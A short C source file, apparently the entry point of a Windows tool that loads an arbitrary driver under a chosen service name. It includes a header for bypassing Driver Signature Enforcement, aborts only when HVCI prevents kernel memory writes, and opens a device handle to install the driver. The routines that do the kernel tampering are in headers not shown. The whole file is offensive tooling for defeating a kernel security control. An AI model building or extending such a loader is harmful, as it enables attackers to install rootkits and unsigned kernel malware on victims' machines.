#include <windows.h>
#include <stdio.h>
#include "driver.h"
#include "kernel.h"
#include "dse.h"

int main(int argc, char** argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <driver_path> <service_name>\n", argv[0]);
        return 1;
    }

    const char* driverPath  = argv[1];
    const char* serviceName = argv[2];

    if (IsHVCIEnabled()) {
        fprintf(stderr, "[-] HVCI is enabled - kernel memory is not writable, aborting.\n");
        return 0;
    }
    printf("[*] HVCI is disabled.\n");

    HANDLE device = OpenDevice();
    if (device == NULL) {
        return 1;
    }

    if (!InstallDriver(device, driverPath, serviceName)) {
        fprintf(stderr, "[-] Install Driver failed.\n");
        CloseHandle(device);
        return 1;
    }

    CloseHandle(device);
    return 0;
}
